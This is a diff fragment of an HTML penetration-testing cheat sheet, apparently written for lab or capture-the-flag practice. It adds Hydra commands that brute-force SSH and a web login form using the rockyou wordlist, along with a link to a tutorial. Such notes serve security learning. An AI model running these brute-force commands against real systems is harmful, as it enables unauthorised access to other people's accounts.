@@ -332,8 +332,10 @@ Then, use John on the unshadowed file using a wordlist or rules mangling : john 
 Identifying Hash: hash-identifier
 For other services, use Medusa or Hydra. Eg:</font></p>
 <pre style="background-color:black;color:white;">
-hydra -L [USERNAME_FILE] -P [PASSWORD_FILE] -v [IP_ADDRESS] ssh -t 4
-medusa -h [IP_ADDRESS] -U [USERNAME_FILE] -P PASSWORD_FILE] -M http -m DIR:/admin -T 30
+#https://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-online-web-form-passwords-with-thc-hydra-burp-suite-0160643/
+
+hydra -L [USERNAME_FILE] -P [PASSWORD_FILE] -v [IP_ADDRESS] ssh -t 4	#Brute force ssh
+hydra -l Admin -P /usr/share/wordlists/rockyou.txt 10.10.10.6 http-post-form "/torrent/login.php:username=^USER^&password=^PASS^&Login=Login:Invalid login, please try again" -V	#Brute force login form example
 </pre>
 <p><font size="3.5" color="black">Using hashcat for cracking hashes:</font></p>
 <pre style="background-color:black;color:white;">
